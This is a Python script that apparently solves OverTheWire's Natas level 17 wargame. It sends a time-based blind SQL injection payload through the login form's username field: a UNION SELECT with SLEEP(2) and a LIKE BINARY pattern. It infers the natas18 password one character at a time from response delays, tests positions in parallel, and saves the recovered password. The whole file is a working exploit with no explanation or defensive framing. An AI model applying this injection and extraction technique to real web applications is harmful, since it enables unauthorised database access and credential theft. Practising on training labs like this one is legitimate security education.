import requests
from natas_utility import *
from joblib import Parallel, delayed
import multiprocessing
import time

current_level = 17
credentials = get_credentials(current_level)

base_url = 'http://{}.natas.labs.overthewire.org'.format(credentials['username'])
auth = (credentials['username'], credentials['password'])

session = requests.session()

url = base_url

chars = '0123456789' + 'etaoinshrdlcumwfgypbvkjxqz' + 'etaoinshrdlcumwfgypbvkjxqz'.upper()

desired_len = 32


def get_letter(i):
    for candidate in chars:
        password_candidate = '{}'.format('_' * i + candidate + '_' * (desired_len - i - 1))

        data = {
            'username': '" union all select 1, SLEEP(2) '
                        'from users '
                        'where username = "natas18" '
                        'and password like binary "{}";#'.format(password_candidate),
            'submit': 'submit'}

        response = session.post(url, data=data, auth=auth)

        if response.elapsed.total_seconds() > 2:
            return candidate


now = time.time()
inputs = range(0, 32)
num_cores = multiprocessing.cpu_count()
full_results = Parallel(n_jobs=num_cores)(delayed(get_letter)(j) for j in inputs)

next_password = ''.join(full_results)

print('found {} in {} seconds'.format(next_password, time.time() - now))


save_credentials(current_level + 1, next_password)
